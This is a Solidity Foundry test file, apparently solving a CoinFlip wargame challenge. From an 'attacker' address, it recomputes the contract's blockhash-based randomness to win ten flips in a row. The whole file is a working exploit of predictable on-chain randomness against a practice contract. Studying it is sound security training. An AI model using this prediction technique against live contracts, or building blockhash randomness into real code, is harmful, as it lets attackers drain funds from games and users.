
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {DeployCoinFlip} from "../script/DeployCoinFlip.s.sol";


contract CoinFlipTest is Test {

    CoinFlip coinFlipContract;
    DeployCoinFlip deployer;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 public lastHash;
    uint256 public consecutiveWins;
    uint256 public increment = 1;
    bool public _guess = false;

    address public attacker = makeAddr("attacker");

    function setUp() external {
        deployer = new DeployCoinFlip();
        coinFlipContract = deployer.run();
        vm.deal(attacker, 100 ether);
    }

    function testRandomNumberIsPredictable() external {
        vm.startPrank(attacker);
        while (consecutiveWins < 10) {
            console2.log("Current Consecutive Wins: ", consecutiveWins);
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                bool isTrue = coinFlipContract.flip(_guess);
                if (isTrue) {
                    consecutiveWins++;
                    vm.roll(block.number + increment);
                    increment++;
                }
            } else if (side != _guess) {
                _guess = !_guess;
                vm.roll(block.number + increment);
                increment++;
            }
        }
        vm.stopPrank();
        console2.log("You WON! Current Consecutive Wins: ", consecutiveWins);
    }


}